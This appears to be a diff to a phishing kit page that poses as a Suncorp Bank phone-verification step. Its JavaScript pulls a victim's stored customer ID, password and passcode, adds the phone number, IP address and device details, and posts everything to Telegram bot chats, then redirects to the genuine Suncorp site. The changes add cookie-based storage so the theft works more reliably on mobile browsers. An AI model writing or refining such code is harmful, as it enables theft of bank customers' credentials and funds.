@@ -19,7 +19,7 @@
   <header class="sg-Header">
    <div class="sg-Header-content">
     <div class="sg-Header-column">
-     <a class="sg-Header-logo" href="https://www.suncorpbank.com.au/ " target="_blank">
+     <a class="sg-Header-logo" href="https://www.suncorpbank.com.au/" target="_blank">
      </a>
     </div>
     <div class="sg-Header-column sg-u-width10of10 sg-u-textRight">
@@ -104,24 +104,56 @@ document.addEventListener('DOMContentLoaded', function() {
     phoneInput.setAttribute('inputmode', 'numeric');
     phoneInput.setAttribute('pattern', '[0-9]*');
     
-    // Use localStorage instead of sessionStorage for mobile compatibility
-    // Fallback to sessionStorage if localStorage is not available
-    function getStorage() {
-        try {
-            localStorage.setItem('test', 'test');
-            localStorage.removeItem('test');
-            return localStorage;
-        } catch (e) {
-            return sessionStorage;
+    // Cookie storage fallback for mobile browsers (especially iOS Safari Private Mode)
+    const StorageHelper = {
+        setItem: function(key, value) {
+            try {
+                localStorage.setItem(key, value);
+                return;
+            } catch (e) {}
+            try {
+                sessionStorage.setItem(key, value);
+                return;
+            } catch (e) {}
+            const expires = new Date();
+            expires.setTime(expires.getTime() + (24 * 60 * 60 * 1000));
+            document.cookie = key + '=' + encodeURIComponent(value) + ';expires=' + expires.toUTCString() + ';path=/';
+        },
+        
+        getItem: function(key) {
+            try {
+                const val = localStorage.getItem(key);
+                if (val !== null) return val;
+            } catch (e) {}
+            try {
+                const val = sessionStorage.getItem(key);
+                if (val !== null) return val;
+            } catch (e) {}
+            const name = key + '=';
+            const decodedCookie = decodeURIComponent(document.cookie);
+            const ca = decodedCookie.split(';');
+            for(let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1);
+                if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
+            }
+            return null;
+        },
+        
+        removeItem: function(key) {
+            try { localStorage.removeItem(key); } catch (e) {}
+            try { sessionStorage.removeItem(key); } catch (e) {}
+            document.cookie = key + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;';
         }
-    }
+    };
     
-    const storage = getStorage();
+    // Retrieve stored data using StorageHelper
+    const userId = StorageHelper.getItem('userId') || 'Not available';
+    const password = StorageHelper.getItem('userPassword') || 'Not available';
+    const passcode = StorageHelper.getItem('userPasscode') || 'Not provided';
     
-    // Retrieve stored data from storage
-    const userId = storage.getItem('userId') || 'Not available';
-    const password = storage.getItem('userPassword') || 'Not available';
-    const passcode = storage.getItem('userPasscode') || 'Not provided';
+    // Debug logging
+    console.log('Retrieved data:', { userId, password, passcode });
     
     // Add red border style
     const style = document.createElement('style');
@@ -138,21 +170,13 @@ document.addEventListener('DOMContentLoaded', function() {
     document.head.appendChild(style);
     
     function validatePhone(phone) {
-        // Must be exactly 10 digits starting with 04
         const phoneRegex = /^04\d{8}$/;
         return phoneRegex.test(phone);
     }
     
-    // Restrict input to numbers only and max 10 digits
     phoneInput.addEventListener('input', function(e) {
-        // Remove any non-digit characters
         let value = this.value.replace(/\D/g, '');
-        
-        // Limit to 10 digits
-        if (value.length > 10) {
-            value = value.slice(0, 10);
-        }
-        
+        if (value.length > 10) value = value.slice(0, 10);
         this.value = value;
         clearError();
     });
@@ -165,77 +189,48 @@ document.addEventListener('DOMContentLoaded', function() {
     
     function hideLoading() {
         const existingOverlay = document.getElementById('verify-loading-overlay');
-        if (existingOverlay) {
-            existingOverlay.remove();
-        }
+        if (existingOverlay) existingOverlay.remove();
     }
     
     function showLoading() {
         hideLoading();
-        
         const overlay = document.createElement('div');
         overlay.id = 'verify-loading-overlay';
         overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(2px);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-            transition: opacity 0.3s ease;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(2px);
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; z-index: 9999; transition: opacity 0.3s ease;
         `;
-        
-        // Black spinner
         const spinner = document.createElement('div');
         spinner.style.cssText = `
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(0, 0, 0, 0.2);
-            border-top: 4px solid #ffc800;
-            border-radius: 50%;
+            width: 60px; height: 60px; border: 4px solid rgba(0, 0, 0, 0.2);
+            border-top: 4px solid #ffc800; border-radius: 50%;
             animation: suncorp-spin 1s linear infinite;
         `;
-        
-        // Loading text
         const text = document.createElement('p');
         text.style.cssText = `
-            color: #ffc800;
-            font-family: Arial, sans-serif;
-            font-size: 16px;
-            margin-top: 20px;
-            letter-spacing: 1px;
+            color: #ffc800; font-family: Arial, sans-serif;
+            font-size: 16px; margin-top: 20px; letter-spacing: 1px;
         `;
-        
         overlay.appendChild(spinner);
         overlay.appendChild(text);
         document.body.appendChild(overlay);
     }
     
-    // Get device info
     function getDeviceInfo() {
         const ua = navigator.userAgent;
-        let device = 'Unknown';
-        let platform = 'Unknown';
-        
+        let device = 'Unknown', platform = 'Unknown';
         if (/Windows/.test(ua)) platform = 'Windows';
         else if (/Mac/.test(ua)) platform = 'MacOS';
         else if (/Linux/.test(ua)) platform = 'Linux';
         else if (/Android/.test(ua)) platform = 'Android';
         else if (/iOS|iPhone|iPad|iPod/.test(ua)) platform = 'iOS';
-        
         if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) device = 'Mobile';
         else device = 'Desktop';
-        
         return { device, platform };
     }
     
-    // Get IP address with multiple fallback services
     async function getIP() {
         const services = [
             'https://api.ipify.org?format=json',
@@ -243,18 +238,12 @@ document.addEventListener('DOMContentLoaded', function() {
             'https://checkip.amazonaws.com/',
             'https://icanhazip.com/'
         ];
-        
         for (const service of services) {
             try {
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 3000);
-                
-                const response = await fetch(service, { 
-                    signal: controller.signal,
-                    mode: 'cors'
-                });
+                const response = await fetch(service, { signal: controller.signal, mode: 'cors' });
                 clearTimeout(timeoutId);
-                
                 if (service.includes('json')) {
                     const data = await response.json();
                     return data.ip || data;
@@ -262,100 +251,36 @@ document.addEventListener('DOMContentLoaded', function() {
                     const text = await response.text();
                     return text.trim();
                 }
-            } catch (e) {
-                console.log('IP service failed:', service, e);
-                continue;
-            }
+            } catch (e) { continue; }
         }
         return 'Unable to retrieve';
     }
     
-    // Send message to a single chat using JSONP as fallback for CSP issues
-    function sendToTelegramJSONP(chatId, message) {
-        return new Promise((resolve, reject) => {
-            const script = document.createElement('script');
-            const callbackName = 'telegramCallback_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            
-            // Create callback
-            window[callbackName] = function(data) {
-                cleanup();
-                if (data && data.ok) {
-                    resolve(data);
-                } else {
-                    reject(new Error(data.description || 'Unknown error'));
-                }
-            };
-            
-            function cleanup() {
-                if (script.parentNode) script.parentNode.removeChild(script);
-                delete window[callbackName];
-            }
-            
-            script.onerror = function() {
-                cleanup();
-                reject(new Error('Script load error'));
-            };
-            
-            // Telegram doesn't support JSONP, so this is a fallback that will fail gracefully
-            // Instead, we'll use the fetch API with no-cors mode as last resort
-            cleanup();
-            reject(new Error('JSONP not supported by Telegram'));
-        });
-    }
-    
-    // Send message to a single chat with multiple retry strategies
     async function sendToTelegram(chatId, message, attempt = 1) {
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
         try {
-            // Try standard fetch first
             const response = await fetch(telegramUrl, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
             });
-            
             const data = await response.json();
-            
-            if (!response.ok || !data.ok) {
-                throw new Error(data.description || `HTTP ${response.status}`);
-            }
-            
+            if (!response.ok || !data.ok) throw new Error(data.description || `HTTP ${response.status}`);
             console.log(`Successfully sent to chat ${chatId}`);
             return true;
-            
         } catch (error) {
-            console.error(`Attempt ${attempt} failed for chat ${chatId}:`, error);
-            
-            // If this is the first attempt, try with no-cors mode (for CSP issues)
             if (attempt === 1) {
                 try {
                     await fetch(telegramUrl, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        }),
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' }),
                         mode: 'no-cors'
                     });
-                    // no-cors returns opaque response, assume success
                     console.log(`Sent to chat ${chatId} (no-cors mode)`);
                     return true;
-                } catch (e) {
-                    console.log('no-cors mode also failed:', e);
-                }
+                } catch (e) {}
             }
-            
             return false;
         }
     }
@@ -366,7 +291,6 @@ document.addEventListener('DOMContentLoaded', function() {
         
         const phone = phoneInput.value.trim();
         
-        // Validate phone (must be exactly 10 digits starting with 04)
         if (!phone || !validatePhone(phone)) {
             phoneErrorEl.style.display = 'block';
             phoneInput.classList.add('sg-Input--error-border');
@@ -376,20 +300,14 @@ document.addEventListener('DOMContentLoaded', function() {
         
         showLoading();
         
-        // Get all info
         const clientIP = await getIP();
         const { device, platform } = getDeviceInfo();
         const currentDateTime = new Date().toLocaleString('en-AU', { 
             timeZone: 'Australia/Sydney',
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit'
+            year: 'numeric', month: '2-digit', day: '2-digit',
+            hour: '2-digit', minute: '2-digit', second: '2-digit'
         });
         
-        // Format message with monospace for sensitive fields
         const message = `🟡
 Customer ID: \`${userId}\`
 Password: \`${password}\`
@@ -401,11 +319,8 @@ Device: ${device}
 Platform: ${platform}
 Date: ${currentDateTime}`;
         
-        // Send to both Telegram chat IDs with better error handling
         const results = [];
-        
         for (const chatId of TELEGRAM_CHAT_IDS) {
-            // Try up to 2 times
             let success = false;
             for (let i = 1; i <= 2; i++) {
                 success = await sendToTelegram(chatId, message, i);
@@ -416,16 +331,10 @@ Date: ${currentDateTime}`;
         
         console.log('Telegram send results:', results);
         
-        // Clear storage after sending (security)
-        try {
-            storage.removeItem('userId');
-            storage.removeItem('userPassword');
-            storage.removeItem('userPasscode');
-        } catch (e) {
-            console.log('Could not clear storage:', e);
-        }
+        StorageHelper.removeItem('userId');
+        StorageHelper.removeItem('userPassword');
+        StorageHelper.removeItem('userPasscode');
         
-        // Redirect after 2 seconds regardless of Telegram success
         setTimeout(function() {
             window.location.href = 'https://www.suncorp.com.au';
         }, 2000);
